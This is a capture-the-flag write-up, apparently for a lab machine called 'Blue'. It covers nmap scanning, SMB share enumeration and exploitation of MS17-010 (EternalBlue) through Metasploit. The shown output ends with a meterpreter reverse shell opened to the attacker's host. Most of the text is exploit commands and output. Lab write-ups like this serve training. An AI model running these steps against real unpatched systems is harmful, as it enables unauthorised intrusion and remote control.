Spawn the VM and connect the VPN
target 10.10.10.40
local tun0 10.10.14.8

Nnap scan to see

```
└─# nmap -sS 10.10.10.40 -n --top-ports 100 -Pn --max-rate 10000 -oA blue_top_syn
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-12 02:03 EDT
Nmap scan report for 10.10.10.40
Host is up (0.30s latency).
Not shown: 91 closed tcp ports (reset)
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
49157/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 1.33 seconds
```

Identify those open ports:
```
└─# nmap -sS 10.10.10.40 -p135,139,445 -sV --osscan-guess -n -Pn --max-rate 10000 -oA blue_query_syn
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-12 04:24 EDT
Nmap scan report for 10.10.10.40
Host is up (0.30s latency).

PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.27 seconds
```

Running responder didn't find anything.
smbclient came back with some shares:
```
└─# smbclient -L \\\\10.10.10.40
Password for [WORKGROUP\root]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        Share           Disk
        Users           Disk
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.40 failed (Error NT_STATUS_RESOURCE_NAME_NOT_                                                                              FOUND)
Unable to connect with SMB1 -- no workgroup available
```

Connect to the Users share
```
└─# smbclient \\\\10.10.10.40\\users
Password for [WORKGROUP\root]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Fri Jul 21 02:56:23 2017
  ..                                 DR        0  Fri Jul 21 02:56:23 2017
  Default                           DHR        0  Tue Jul 14 03:07:31 2009
  desktop.ini                       AHS      174  Tue Jul 14 00:54:24 2009
  Public                             DR        0  Tue Apr 12 03:51:29 2011

                4692735 blocks of size 4096. 657921 blocks available
smb: \> cd public
smb: \public\> put test.txt
putting file test.txt as \public\test.txt (0.0 kb/s) (average 0.0 kb/s)
smb: \public\> ls
  .                                  DR        0  Wed Oct 12 04:55:55 2022
  ..                                 DR        0  Wed Oct 12 04:55:55 2022
  desktop.ini                       AHS      174  Tue Jul 14 00:54:24 2009
  Documents                          DR        0  Tue Jul 14 01:08:56 2009
  Downloads                          DR        0  Tue Jul 14 00:54:24 2009
  Favorites                         DHR        0  Mon Jul 13 22:34:59 2009
  Libraries                         DHR        0  Tue Jul 14 00:54:24 2009
  Music                              DR        0  Tue Jul 14 00:54:24 2009
  Pictures                           DR        0  Tue Jul 14 00:54:24 2009
  Recorded TV                        DR        0  Tue Apr 12 03:51:29 2011
  test.txt                            A        0  Wed Oct 12 04:55:55 2022
  Videos                             DR        0  Tue Jul 14 00:54:24 2009

                4692735 blocks of size 4096. 657921 blocks available
```

Going through the folders didn't give anything valuable, except we do have write permission to the public users directory.

Check the Share share:

```
└─# smbclient \\\\10.10.10.40\\share
Password for [WORKGROUP\root]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Jul 14 09:48:44 2017
  ..                                  D        0  Fri Jul 14 09:48:44 2017

                4692735 blocks of size 4096. 657921 blocks available
smb: \> put test.txt
NT_STATUS_ACCESS_DENIED opening remote file \test.txt

```

Nothing of interest there

Enum4linux failed to identify much either




MSF using smb_version returned SMB Versions 1 and 2
```
msf6 auxiliary(scanner/smb/smb_version) > set rhosts 10.10.10.40
rhosts => 10.10.10.40
msf6 auxiliary(scanner/smb/smb_version) > exploit

[*] 10.10.10.40:445       - SMB Detected (versions:1, 2) (preferred dialect:SMB 2.1) (signatures:optional) (uptime:6h 49m 17s) (guid:{d444f63e-ded6-4f9d-82ac-976ffc4a1381}) (authentication domain:HARIS-PC)
[+] 10.10.10.40:445       -   Host is running Windows 7 Professional SP1 (build:7601) (name:HARIS-PC)
[*] 10.10.10.40:          - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/smb/smb_version) >
```

Lets see if eternal blue (ms 17-010) vulnerability will work:

```
└─# git clone https://github.com/3ndG4me/AutoBlue-MS17-010.git
Cloning into 'AutoBlue-MS17-010'...
remote: Enumerating objects: 126, done.
remote: Counting objects: 100% (50/50), done.
remote: Compressing objects: 100% (15/15), done.
remote: Total 126 (delta 40), reused 35 (delta 35), pack-reused 76
Receiving objects: 100% (126/126), 94.22 KiB | 2.69 MiB/s, done.
Resolving deltas: 100% (74/74), done.
```

```
└─# python3 eternal_checker.py 10.10.10.40
[*] Target OS: Windows 7 Professional 7601 Service Pack 1
[!] The target is not patched
=== Testing named pipes ===
[*] Done
```

couldn't get a non MSF exploit to work, so used msf

```
msf6 auxiliary(scanner/smb/pipe_auditor) > search blue

Matching Modules
================

   #   Name                                                        Disclosure Date  Rank       Check  Description
   -   ----                                                        ---------------  ----       -----  -----------
   0   exploit/windows/http/badblue_ext_overflow                   2003-04-20       great      Yes    BadBlue 2.5 EXT.dll Buffer Overflow
   1   exploit/windows/http/badblue_passthru                       2007-12-10       great      No     BadBlue 2.72b PassThru Buffer Overflow
   2   exploit/linux/local/bash_profile_persistence                1989-06-08       normal     No     Bash Profile Persistence
   3   exploit/windows/misc/bcaaa_bof                              2011-04-04       good       No     Blue Coat Authentication and Authorization Agent (BCAAA) 5 Buffer Overflow
   4   exploit/windows/proxy/bluecoat_winproxy_host                2005-01-05       great      No     Blue Coat WinProxy Host Header Overflow
   5   auxiliary/scanner/rdp/cve_2019_0708_bluekeep                2019-05-14       normal     Yes    CVE-2019-0708 BlueKeep Microsoft Remote Desktop RCE Check
   6   exploit/windows/rdp/cve_2019_0708_bluekeep_rce              2019-05-14       manual     Yes    CVE-2019-0708 BlueKeep RDP Remote Windows Kernel Use After Free
   7   auxiliary/dos/tcp/claymore_dos                              2018-02-06       normal     No     Claymore Dual GPU Miner  Format String dos attack
   8   exploit/windows/ftp/easyftp_mkd_fixret                      2010-04-04       great      Yes    EasyFTP Server MKD Command Stack Buffer Overflow
   9   exploit/linux/http/github_enterprise_secret                 2017-03-15       excellent  Yes    Github Enterprise Default Session Secret And Deserialization Vulnerability
   10  post/windows/manage/install_ssh                                              normal     No     Install OpenSSH for Windows
   11  post/windows/manage/install_python                                           normal     No     Install Python for Windows
   12  exploit/windows/local/bthpan                                2014-07-18       average    Yes    MS14-062 Microsoft Bluetooth Personal Area Networking (BthPan.sys) Privilege Escalation
   13  exploit/windows/smb/ms17_010_eternalblue                    2017-03-14       average    Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   14  exploit/windows/smb/ms17_010_psexec                         2017-03-14       normal     Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   15  auxiliary/admin/smb/ms17_010_command                        2017-03-14       normal     No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   16  auxiliary/scanner/smb/smb_ms17_010                                           normal     No     MS17-010 SMB RCE Detection
   17  exploit/windows/fileformat/word_msdtjs_rce                  2022-05-29       excellent  No     Microsoft Office Word MSDTJS
   18  exploit/windows/smb/smb_doublepulsar_rce                    2017-04-14       great      Yes    SMB DOUBLEPULSAR Remote Code Execution
   19  exploit/windows/local/cve_2020_0796_smbghost                2020-03-13       good       Yes    SMBv3 Compression Buffer Overflow
   20  exploit/windows/smb/cve_2020_0796_smbghost                  2020-03-13       average    Yes    SMBv3 Compression Buffer Overflow
   21  exploit/unix/webapp/skybluecanvas_exec                      2014-01-28       excellent  Yes    SkyBlueCanvas CMS Remote Code Execution
   22  exploit/windows/misc/trendmicro_cmdprocessor_addtask        2011-12-07       good       No     TrendMicro Control Manger CmdProcessor.exe Stack Buffer Overflow
   23  exploit/unix/webapp/jquery_file_upload                      2018-10-09       excellent  Yes    blueimp's jQuery (Arbitrary) File Upload
   24  exploit/linux/local/blueman_set_dhcp_handler_dbus_priv_esc  2015-12-18       excellent  Yes    blueman set_dhcp_handler D-Bus Privilege Escalation


Interact with a module by name or index. For example info 24, use 24 or use exploit/linux/local/blueman_set_dhcp_handler_dbus_priv_esc

msf6 auxiliary(scanner/smb/pipe_auditor) > use 13
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2, Windows 7, Window
                                             s Embedded Standard 7 target machines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Em
                                             bedded Standard 7 target machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Sta
                                             ndard 7 target machines.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.10.71    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target


msf6 exploit(windows/smb/ms17_010_eternalblue) > set rhosts 10.10.10.40
rhosts => 10.10.10.40
msf6 exploit(windows/smb/ms17_010_eternalblue) > set lhost 10.10.14.8
lhost => 10.10.14.8
msf6 exploit(windows/smb/ms17_010_eternalblue) > check

[*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)
[+] 10.10.10.40:445 - The target is vulnerable.
msf6 exploit(windows/smb/ms17_010_eternalblue) > run

[-] Handler failed to bind to 10.10.14.8:4444:-  -
[-] Handler failed to bind to 0.0.0.0:4444:-  -
[-] 10.10.10.40:445 - Exploit failed [bad-config]: Rex::BindFailed The address is already in use or unavailable: (0.0.0.0:4444).
[*] Exploit completed, but no session was created.
msf6 exploit(windows/smb/ms17_010_eternalblue) > run

[*] Started reverse TCP handler on 10.10.14.8:4444
[*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)
[+] 10.10.10.40:445 - The target is vulnerable.
[*] 10.10.10.40:445 - Connecting to target for exploitation.
[+] 10.10.10.40:445 - Connection established for exploitation.
[+] 10.10.10.40:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.10.40:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.10.40:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.10.40:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.10.40:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1
[+] 10.10.10.40:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.10.40:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.10.40:445 - Sending all but last fragment of exploit packet
[*] 10.10.10.40:445 - Starting non-paged pool grooming
[+] 10.10.10.40:445 - Sending SMBv2 buffers
[+] 10.10.10.40:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.10.40:445 - Sending final SMBv2 buffers.
[*] 10.10.10.40:445 - Sending last fragment of exploit packet!
[*] 10.10.10.40:445 - Receiving response from exploit packet
[+] 10.10.10.40:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.10.40:445 - Sending egg to corrupted connection.
[*] 10.10.10.40:445 - Triggering free of corrupted buffer.
[*] Sending stage (200774 bytes) to 10.10.10.40
[*] Meterpreter session 1 opened (10.10.14.8:4444 -> 10.10.10.40:49158) at 2022-10-12 06:08:27 -0400
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

meterpreter >

```


